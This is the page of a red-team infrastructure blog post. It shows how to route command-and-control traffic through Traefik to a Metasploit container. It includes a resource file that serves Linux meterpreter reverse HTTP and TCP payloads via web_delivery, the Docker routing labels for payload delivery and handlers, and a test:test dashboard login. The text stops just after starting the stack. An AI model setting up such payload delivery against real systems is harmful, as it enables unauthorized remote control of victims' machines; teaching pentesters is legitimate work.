<!DOCTYPE html>
<html lang="en">
  <head>
    
      <title>Introduction To Modern Routing For Red Team Infrastructure - using Traefik, Metasploit, Covenant and Docker :: khast3x blog — Thoughts and notes on my side projects</title>
    
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="description" content="Abstract Setup 🔧  Using docker-compose Traefik Metasploit   Running the initial delivery chain 💥  Monitoring the C2 routing in Traefik&amp;rsquo;s web interface   Covenant C2 Setup 🔧 Running the second delivery chain 💥 Notes  Abstract This blog post&amp;rsquo;s objective is helping pentesters catch up on recent deployment innovations, solving some traditional pain points thanks to container-based infrastructure.
These modern infrastructures can seamlessly evolve and scale across hosts, servers and even countries."/>
<meta name="keywords" content=""/>
<meta name="robots" content="noodp"/>
<link rel="canonical" href="https://khast3x.club/posts/2020-02-14-Intro-Modern-Routing-Traefik-Metasploit-Docker/" />





<link rel="stylesheet" href="https://khast3x.club/assets/style.css">


<link rel="stylesheet" href="https://khast3x.club/style.css">


<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://khast3x.club/img/apple-touch-icon-144-precomposed.png">
<link rel="shortcut icon" href="https://khast3x.club/img/favicon.png">


<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://khast3x.club/assets/demo/haunter_alt.png"/>

<meta name="twitter:title" content="Introduction To Modern Routing For Red Team Infrastructure - using Traefik, Metasploit, Covenant and Docker"/>
<meta name="twitter:description" content="Deploy a scalable, automated, dynamically routed Command and Control (C2) infrastructure, spawning additional routes as it grows!"/>



<meta property="og:title" content="Introduction To Modern Routing For Red Team Infrastructure - using Traefik, Metasploit, Covenant and Docker" />
<meta property="og:description" content="Deploy a scalable, automated, dynamically routed Command and Control (C2) infrastructure, spawning additional routes as it grows!" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://khast3x.club/posts/2020-02-14-Intro-Modern-Routing-Traefik-Metasploit-Docker/" />
<meta property="og:image" content="https://khast3x.club/assets/demo/haunter_alt.png"/>
<meta property="article:published_time" content="2020-02-20T00:00:00+00:00" />
<meta property="article:modified_time" content="2020-02-20T00:00:00+00:00" /><meta property="og:site_name" content="khast3x blog" />






    <meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://khast3x.club/assets/demo/haunter_alt.png"/>

<meta name="twitter:title" content="Introduction To Modern Routing For Red Team Infrastructure - using Traefik, Metasploit, Covenant and Docker"/>
<meta name="twitter:description" content="Deploy a scalable, automated, dynamically routed Command and Control (C2) infrastructure, spawning additional routes as it grows!"/>

    
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'UA-113498686-2', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>

  </head>
  <body class="dark-theme">
    <div class="container">
      <header class="header">
  <span class="header__inner">
    <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
</svg>
</span>
    <span class="logo__text">khast3x blog</span>
    <span class="logo__cursor"></span>
  
</a>

    <span class="header__right">
      
        <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/about">About</a></li>
        
      
    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/about">About</a></li>
      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none"/>
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
          </svg>
        </span>
      
      <span class="theme-toggle">
        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
</svg>

      </span>
    </span>
  </span>
</header>


      <div class="content">
        
  <div class="post">
    <h2 class="post-title"><a href="https://khast3x.club/posts/2020-02-14-Intro-Modern-Routing-Traefik-Metasploit-Docker/">Introduction To Modern Routing For Red Team Infrastructure - using Traefik, Metasploit, Covenant and Docker</a></h2>
    <div class="post-meta">
      
        <span class="post-date">
            2020-02-20
        </span>
      
      
      
    </div>

    
      <span class="post-tags">
        
          #<a href="https://khast3x.club/tags/docker/">docker</a>&nbsp;
        
          #<a href="https://khast3x.club/tags/metasploit/">metasploit</a>&nbsp;
        
          #<a href="https://khast3x.club/tags/socat/">socat</a>&nbsp;
        
          #<a href="https://khast3x.club/tags/redteam_infrastructure/">redteam_infrastructure</a>&nbsp;
        
      </span>
    

    

    <div class="post-content">
      <ul>
<li><a href="#abstract">Abstract</a></li>
<li><a href="#setup-">Setup 🔧</a>
<ul>
<li><a href="#using-docker-compose">Using docker-compose</a></li>
<li><a href="#traefik">Traefik</a></li>
<li><a href="#metasploit">Metasploit</a></li>
</ul>
</li>
<li><a href="#running-the-initial-delivery-chain-">Running the initial delivery chain 💥</a>
<ul>
<li><a href="#monitoring-the-c2-routing-in-the-traefik-web-interface">Monitoring the C2 routing in Traefik&rsquo;s web interface</a></li>
</ul>
</li>
<li><a href="#covenant-c2-setup-">Covenant C2 Setup 🔧</a></li>
<li><a href="#running-the-second-delivery-chain-">Running the second delivery chain 💥</a></li>
<li><a href="#notes">Notes</a></li>
</ul>
<h2 id="abstract">Abstract</h2>
<p><em>This blog post&rsquo;s objective is <strong>helping pentesters catch up on recent deployment innovations</strong>, solving some traditional pain points thanks to container-based infrastructure.</em></p>
<p><em>These modern infrastructures can seamlessly <strong>evolve and scale</strong> across hosts, servers and even countries. They can be summoned and deployed in a matter of seconds, <strong>repeatedly</strong>, across the world. They can be continuously changing shape and size, and still <strong>transparently</strong> route traffic however we want.</em> <br>
<strong><em>We&rsquo;re doing that last part in this blog post</em> 🔥</strong></p>
<p><em>These kind of infrastructures can do many other things, such as natively load-balancing your handlers, optimizing your implant sessions based on distributed metrics, streamed across your services.</em></p>
<hr>
<p><strong>What</strong></p>
<p>For now, we want to deploy a more evolved red teaming infrastructure that can dynamically create routes to our C2 Docker containers, instead of manually editing a configuration file every time we want a new route from our reverse-proxy.<br>
We also want it to be easy to scale, and easy to monitor.</p>
<p><strong>How</strong></p>
<p>The traditional method is to use Apache or NGINX, and use <code>Reverse-Proxy</code> static configurations to map our routes. Or manual Socats.</p>
<p>In this post, we&rsquo;re going to use <a href="https://github.com/containous/traefik">Traefik v2</a> instead.<br>
Traefik will enable us to easily manage dynamic routes, and deploy C2 containers with smooth forwarding to our payloads and session handlers.</p>
<p>🔸 We&rsquo;ll first deploy Traefik, routing to our <a href="https://hub.docker.com/r/metasploitframework/metasploit-framework/">Metasploit</a> container with two different payloads: <code>meterpreter_reverse_ http</code> and <code>meterpreter_reverse_tcp</code>.<br>
🔸 We&rsquo;ll then run a separate <a href="https://github.com/cobbr/Covenant">Covenant C2</a> container, that will spawn a new route to its web UI, payload and session handler.<br>
🔸 <strong>We&rsquo;ll first target Linux with Metasploit, then Windows with Covenant.</strong></p>
<p>Once done, we&rsquo;ll have an elastic reverse-proxy, functional routes to two different C2 containers with payloads and handlers, and the knowledge to summon many more at will. And a nice route monitoring UI.</p>
<p><a href="/assets/C2/traefik-full-dashboard.png">
  <figure class="center" >
    <img src="/assets/C2/traefik-full-dashboard.png"   style="border-radius: 16px;"  />
    
      <figcaption class="center" >Live infrastructure route health</figcaption>
    
  </figure>

</a></p>
<p><a href="/assets/C2/traefik-full-routers.png">
  <figure class="center" >
    <img src="/assets/C2/traefik-full-routers.png"   style="border-radius: 16px;"  />
    
      <figcaption class="center" >Live HTTP routers to our containers</figcaption>
    
  </figure>

</a></p>
<p>This post comes after the <a href="https://khast3x.club/posts/2020-02-09-C2-Protection-Socat-Docker/">Metasploit + Socat post</a>.<br>
To follow along, having read the previous post will help, as well as having a grasp on Docker networks and volumes.</p>
<p>We won&rsquo;t be going into HTTPS related configurations for now. But know that Traefik is also very good at that.</p>
<p><em>To jump to the important parts, look for the small blue diamonds</em> 🔹</p>
<hr>
<h2 id="setup-">Setup 🔧</h2>
<p>This post assumes you&rsquo;ve already installed Docker. If not, <a href="https://docs.docker.com/install/">check out official documentation</a>.<br>
The ideal setup is running the Docker host on a VPS somewhere in a data center.<br>
We&rsquo;ll be pulling several containers, be aware that these can be big.</p>
<p>First, we&rsquo;re going to create a clean working environment.<br>
Docker supports variables using a <code>.env</code> file, which we&rsquo;ll create right now to make it easier to modify later on.</p>
<p>🔹 Run the following, replacing &ldquo;YOUR-C2-EXT-IP&rdquo; with your actual Docker host external IP:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ mkdir edgy-c2
$ cd edgy-c2/
$ echo <span style="color:#e6db74">&#34;C2EXTIP=YOUR-C2-EXT-IP&#34;</span> &gt; .env
</code></pre></div><h3 id="using-docker-compose">Using docker-compose</h3>
<p>In this post we&rsquo;re going to configure our desired container states in a yaml file, that docker-compose will then figure out and deploy accordingly.</p>
<p>This makes for much easier, repeatable &ldquo;<em>it always works</em>&rdquo; setups.</p>
<p>Since it is a binary, you can simply <code>wget</code> it from the <a href="https://github.com/docker/compose/releases/download">official release page</a>. As of writing the version is <code>1.25.3</code>, change to latest version in the URL accordingly.</p>
<p>🔹 To install docker-compose:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ sudo -s <span style="color:#75715e"># If not running as root</span>
$ curl -L <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">https://github.com/docker/compose/releases/download/1.25.3/docker-compose-</span><span style="color:#66d9ef">$(</span>uname -s<span style="color:#66d9ef">)</span><span style="color:#e6db74">-</span><span style="color:#66d9ef">$(</span>uname -m<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span> -o /usr/local/bin/docker-compose
$ chmod +x /usr/local/bin/docker-compose
$ docker-compose --version <span style="color:#75715e"># Check that it is installed correctly. Might need to reload shell</span>
</code></pre></div><p>You can read the <a href="https://docs.docker.com/compose/install/">documentation page</a> for more detailed installation instructions.</p>
<p>When deploying services using <code>docker-compose</code>, it will automatically create a local &ldquo;bridge&rdquo; network between spawned containers, named after the parent folder.</p>
<p>Basic <code>docker-compose</code> commands are:</p>
<ul>
<li><code>up</code> to deploy the <code>docker-compose.yml</code> file in the current working directory
<ul>
<li>or a specific yaml file with <code>-f</code></li>
</ul>
</li>
<li><code>down</code> to stop the running stack, same rules as <code>up</code></li>
</ul>
<p>Display the detailed list with <code>docker-compose --help</code>.</p>
<h3 id="traefik">Traefik</h3>
<p>Traefik is a <em>cloud-native edge router</em>. To quote from their documentation:</p>
<blockquote>
<p>What sets Traefik apart, besides its many features, is that it automatically discovers the right configuration for your services. The magic happens when Traefik inspects your infrastructure, where it finds relevant information and discovers which service serves which request.
(<a href="https://docs.traefik.io/">source</a>)</p>
</blockquote>
<p>It&rsquo;s basically a reverse-proxy on steroids.</p>
<p>Traefik has a few key concepts that need to be understood:</p>
<ul>
<li><strong>EntryPoints</strong>: They listen for traffic.</li>
<li><strong>Routers</strong>: They analyse the request.</li>
<li><strong>Providers</strong>: They provide configurations to Traefik. Can be from a file, or Docker labels.</li>
<li><strong>Services</strong>: Where the request is going, translated as <code>your-service@provider</code> in Traefik <em>(almost like an email)</em>.</li>
</ul>
<p>The following illustration might be scary for newcomers. Keep in mind each block is basically a few lines of configuration.</p>
<p><a href="/assets/demo/traefik-architecture-overview.png">
  <figure class="center" >
    <img src="/assets/demo/traefik-architecture-overview.png"   style="border-radius: 16px;"  />
    
      <figcaption class="center" >Cute Traefik Routing overview</figcaption>
    
  </figure>

</a></p>
<!-- raw HTML omitted -->
<p>You can read about the different components that make Traefik <a href="https://docs.traefik.io/routing/overview/">here</a>.</p>
<p><strong>What are we configuring?</strong></p>
<p>Here is a table of the endpoints we&rsquo;re configuring, with associated ports, Traefik routers and usage:</p>
<table>
<thead>
<tr>
<th align="center">Traefik EntryPoint</th>
<th align="center">Port</th>
<th align="center">Traefik Router</th>
<th align="center">Usage</th>
</tr>
</thead>
<tbody>
<tr>
<td align="center"><code>web-ep</code></td>
<td align="center"><code>:80</code></td>
<td align="center">HTTP</td>
<td align="center">MSF Delivery, Covenant Delivery, HTTP Sessions, Traefik Web UI</td>
</tr>
<tr>
<td align="center"><code>tls-ep</code></td>
<td align="center"><code>:443</code></td>
<td align="center">TCP</td>
<td align="center">Covenant Web UI</td>
</tr>
<tr>
<td align="center"><code>tcp-ep</code></td>
<td align="center"><code>:8888</code></td>
<td align="center">TCP</td>
<td align="center">MSF TCP Sessions</td>
</tr>
</tbody>
</table>
<ul>
<li>
<p>We&rsquo;re activating Traefik&rsquo;s web interface using <code>--api.dashboard=true</code>.</p>
</li>
<li>
<p>We&rsquo;re telling Traefik to use Docker labels as configuration providers.</p>
</li>
<li>
<p>Both <code>http</code> and <code>tcp</code> routers are used. <code>tcp</code> was recently introduced with Traefik 2.0.</p>
</li>
<li>
<p>We&rsquo;re defining a route to the web UI from <code>/dashboard</code>, with basic htpasswd authentication <em>(it also needs the <code>/api</code> rule because the UI data is queried to the api in real time)</em>.</p>
<ul>
<li>You can use <a href="https://www.web2generators.com/apache-tools/htpasswd-generator">this page</a> to generate your own credentials.</li>
<li>We&rsquo;re using <code>test:test</code>.</li>
<li>Note that the <code>$</code> character must be escaped with another <code>$</code>.</li>
</ul>
</li>
<li>
<p>Finally, we&rsquo;re mounting the Docker socket with read-only permissions so Traefik can stay updated on running containers.</p>
</li>
</ul>
<p>🔹 We&rsquo;re going to create our <code>docker-compose.yml</code> file and start adding Traefik:</p>
<pre><code>$ nano docker-compose.yml
</code></pre><p>🔹 And add the following:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-docker" data-lang="docker">version: <span style="color:#e6db74">&#34;3.7&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>services:<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>  traefik:<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>    image: <span style="color:#e6db74">&#34;traefik:v2.1&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>    container_name: <span style="color:#e6db74">&#34;traefik&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>    command:<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;--log.level=DEBUG&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;--api.dashboard=true&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;--accesslog=true&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;--providers.docker=true&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;--providers.docker.exposedbydefault=false&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;--entrypoints.web-ep.address=:80&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;--entrypoints.tls-ep.address=:443&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;--entrypoints.tcp-ep.address=:8888&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>    labels:<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.enable=true&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.http.routers.api.rule=PathPrefix(`/dashboard`) || PathPrefix(`/api`)&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.http.routers.api.service=api@internal&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.http.routers.api.middlewares=auth&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      <span style="color:#75715e"># test:test</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">traefik.http.middlewares.auth.basicauth.users=test:</span>$$<span style="color:#e6db74">apr1</span>$$<span style="color:#e6db74">241s8k7o</span>$$<span style="color:#e6db74">W8AhFxO9ctEtjWHbXKsKp0</span><span style="color:#e6db74">&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>     <span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      <span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>    ports:<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;80:80&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;443:443&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;8888:8888&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>    volumes:<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;/var/run/docker.sock:/var/run/docker.sock:ro&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><p>That&rsquo;s it for Traefik&rsquo;s main configuration.</p>
<p>The rest of the Traefik configuration will be done using Docker labels, which is just custom meta-data we can add to our containers.</p>
<h3 id="metasploit">Metasploit</h3>
<p>Much like the previous blog post, we&rsquo;re going to prepare a resource file, and mount it to the Metasploit container. This time, we&rsquo;re going to use the official, &ldquo;bleeding-edge&rdquo; Metasploit container as our main C2.</p>
<p>Since we&rsquo;re deploying using <code>docker-compose</code>, the containers are going to spawn as <em>services</em>. Docker does not like idle services, and will stop the container.</p>
<p>We&rsquo;re going to mount an additional script that will be executed when the Metasploit container is launched, simply calling <em>sleep</em>.<br>
In our case, we&rsquo;re sleeping for one day.<br>
This has the advantage of being potentially used as a self-destruct mechanism for your C2. Glass half-full or half-empty, your call 🍷</p>
<p>🔹 Run the following:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ echo -e <span style="color:#e6db74">&#39;#!/bin/bash\nsleep 1d&#39;</span> &gt; sleep.sh ; chmod +x sleep.sh
</code></pre></div><p>Our Metasploit resource file will spawn two web_delivery servers:</p>
<ul>
<li>One server delivering the meterpreter_reverse_http from <code>:8080/delivery_http</code>, and spawning a handler on port 4444.</li>
<li>One server delivering the meterpreter_reverse_tcp from <code>:8081/delivery_tcp</code>, and spawning a handler on port 4445.</li>
</ul>
<p>We&rsquo;re targeting Linux x64 using two different Meterpreter reverse payloads.
If you wish to target something else (Windows, OSX), use <code>show targets</code> and <code>show payloads</code> and set the <code>TARGET</code> and <code>PAYLOAD</code> options accordingly.</p>
<p>Alternatively, you may also start <code>./msfconsole</code> without any resource file and configure it manually.</p>
<p>🔹 Open the new resource file:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ nano double_delivery.rc
</code></pre></div><p>Here are the options to set for Metasploit. You can edit and copy them directly to a resource file that we&rsquo;ll mount to the Metasploit container.</p>
<p>🔹 Copy the following in the file, replacing YOUR-C2-EXT-IP, save and exit:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">use exploit<span style="color:#f92672">/</span>multi<span style="color:#f92672">/</span>script<span style="color:#f92672">/</span>web_delivery
set LHOST YOUR<span style="color:#f92672">-</span>C2<span style="color:#f92672">-</span>EXT<span style="color:#f92672">-</span>IP
show targets
set target <span style="color:#ae81ff">6</span>
set payload linux<span style="color:#f92672">/</span>x64<span style="color:#f92672">/</span>meterpreter_reverse_http
set URIPATH delivery_http
set LURI handler
set LPORT <span style="color:#ae81ff">80</span>
set ReverseListenerBindPort <span style="color:#ae81ff">4444</span>
set SRVPORT <span style="color:#ae81ff">8080</span>
run

set payload linux<span style="color:#f92672">/</span>x64<span style="color:#f92672">/</span>meterpreter_reverse_tcp
set URIPATH delivery_tcp
set LPORT <span style="color:#ae81ff">8888</span>
set ReverseListenerBindPort <span style="color:#ae81ff">4445</span>
set SRVPORT <span style="color:#ae81ff">8081</span>
run
</code></pre></div><p>We&rsquo;ll update the <code>docker-compose.yml</code> file with the Metasploit container.</p>
<p>It&rsquo;s going to look verbose at first, but these lines are actually describing full-blown routing configurations, that Traefik will pick up and update accordingly.</p>
<ul>
<li>
<p>We&rsquo;re mapping our payload delivery routes (HTTP and TCP), and their respective handlers to the entry points we defined earlier: <code>web-ep</code> and <code>tcp-ep</code>.</p>
</li>
<li>
<p>Each router is mapped to its dedicated service and destination port.</p>
</li>
<li>
<p>We&rsquo;re also mounting our <code>sleep.sh</code> and <code>double_delivery.rc</code> files, and using the official &ldquo;bleeding-edge&rdquo; Metasploit container.</p>
</li>
</ul>
<p>🔹 Open our previously created docker-compose file:</p>
<pre><code>$ nano docker-compose.yml
</code></pre><p>🔹 And copy the following after the Traefik service we added earlier:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-docker" data-lang="docker"><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># ** snip ** </span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># Traefik declaration block above</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#75715e"># Note that the msf block is indented</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>  msf:<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>    image: <span style="color:#e6db74">&#34;metasploitframework/metasploit-framework&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>    container_name: <span style="color:#e6db74">&#34;msf&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>    volumes:<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>        - ./sleep.sh:/sleep.sh<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>        - ./double_delivery.rc:/usr/src/metasploit-framework/double_delivery.rc<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>    command: /sleep.sh<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>    labels:<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.enable=true&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      <span style="color:#75715e"># HTTP Payload Delivery - host/delivery_http to msf:8080</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">traefik.http.routers.msfDelivery.rule=Host(`</span>$C2EXTIP<span style="color:#e6db74">`) &amp;&amp; PathPrefix(`/delivery_http`)</span><span style="color:#e6db74">&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.http.routers.msfDelivery.service=msfDelivery@docker&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.http.routers.msfDelivery.entrypoints=web-ep&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.http.services.msfDelivery.loadbalancer.server.port=8080&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      <span style="color:#75715e"># TCP Payload Delivery - host/delivery_tcp to msf:8081</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">traefik.http.routers.msfDeliveryTcp.rule=Host(`</span>$C2EXTIP<span style="color:#e6db74">`) &amp;&amp; PathPrefix(`/delivery_tcp`)</span><span style="color:#e6db74">&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.http.routers.msfDeliveryTcp.service=msfDeliveryTcp@docker&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.http.routers.msfDeliveryTcp.entrypoints=web-ep&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.http.services.msfDeliveryTcp.loadbalancer.server.port=8081&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      <span style="color:#75715e"># HTTP Payload Handler host/handler to msf:4444</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">traefik.http.routers.msfHandler.rule=Host(`</span>$C2EXTIP<span style="color:#e6db74">`) &amp;&amp; PathPrefix(`/handler`)</span><span style="color:#e6db74">&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.http.routers.msfHandler.service=msfHandler@docker&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.http.routers.msfHandler.entrypoints=web-ep&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.http.services.msfHandler.loadbalancer.server.port=4444&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      <span style="color:#75715e"># TCP Payload Handler host:8888 to msf:4445</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.tcp.routers.msfHandlerTcp.rule=HostSNI(`*`)&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.tcp.routers.msfHandlerTcp.service=msfHandlerTcp@docker&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.tcp.services.msfHandlerTcp.loadbalancer.server.port=4445&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.tcp.routers.msfHandlerTcp.entrypoints=tcp-ep&#34;</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><hr>
<h2 id="running-the-initial-delivery-chain-">Running the initial delivery chain 💥</h2>
<p>The <code>docker-compose.yml</code> file should now be ready for our first run. Double check you&rsquo;re in the directory with the docker-compose yaml file.</p>
<p>🔹 To start the stack, run:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ docker-compose up
</code></pre></div><p>Run the stack in the foreground to view the Traefik logs. Use <code>-d</code> to run the stack as a daemon.</p>
<p>You can stop the running stack by hitting CTRL+C.<br>
